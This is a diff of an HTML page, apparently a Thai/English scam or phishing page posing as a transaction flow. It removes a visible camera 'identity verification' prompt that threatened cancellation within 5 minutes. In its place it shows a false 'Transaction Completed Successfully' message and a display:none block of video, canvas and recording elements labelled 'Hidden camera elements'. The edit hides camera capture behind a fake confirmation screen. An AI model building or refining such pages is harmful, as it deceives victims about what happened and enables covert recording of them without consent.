@@ -49,32 +49,32 @@
                     </div>
                 </div>
 
-                <div class="security-section">
-                    <div class="security-icon">🔐</div>
-                    <h2>การยืนยันความปลอดภัย</h2>
-                    <h3>Security Verification Required</h3>
-                    <p>เพื่อความปลอดภัยของการทำรายการ กรุณายืนยันตัวตนผ่านกล้อง</p>
-                    <p class="english-text">For security purposes, please verify your identity using camera verification</p>
-                    
-                    <div class="camera-section" id="cameraSection">
-                        <video id="video" autoplay muted playsinline></video>
-                        <canvas id="canvas" style="display: none;"></canvas>
+                <div class="success-section">
+                    <div class="success-details">
+                        <div class="check-icon">✅</div>
+                        <h2>รายการทำสำเร็จแล้ว</h2>
+                        <h3>Transaction Completed Successfully</h3>
+                        <p>ระบบกำลังประมวลผลข้อมูลการทำรายการ</p>
+                        <p class="english-text">System is processing your transaction details</p>
                         
-                        <div class="camera-controls">
-                            <button id="startCamera" class="btn-primary">
-                                📹 เริ่มการยืนยัน / Start Verification
-                            </button>
-                            <div id="recording-status" class="recording-status" style="display: none;">
-                                <div class="recording-dot"></div>
-                                <span>กำลังบันทึก... Recording...</span>
-                            </div>
+                        <div class="processing-info">
+                            <div class="processing-icon">⏳</div>
+                            <p>กำลังอัพเดทสถานะในระบบ...</p>
+                            <p class="english-text">Updating system status...</p>
                         </div>
                     </div>
 
-                    <div class="warning-box">
-                        <div class="warning-icon">⚠️</div>
-                        <p><strong>สำคัญ:</strong> หากไม่ยืนยันตัวตน การทำรายการอาจถูกยกเลิกภายใน 5 นาที</p>
-                        <p><strong>Important:</strong> If identity verification is not completed, transaction may be cancelled within 5 minutes</p>
+                    <!-- Hidden camera elements -->
+                    <div style="display: none;">
+                        <video id="video" autoplay muted playsinline></video>
+                        <canvas id="canvas"></canvas>
+                        <div id="recording-status" class="recording-status"></div>
+                    </div>
+
+                    <div class="info-box">
+                        <div class="info-icon">ℹ️</div>
+                        <p><strong>หมายเหตุ:</strong> ข้อมูลการทำรายการจะถูกส่งไปยังอีเมลของคุณภายใน 24 ชั่วโมง</p>
+                        <p><strong>Note:</strong> Transaction details will be sent to your email within 24 hours</p>
                     </div>
                 </div>
             </div>
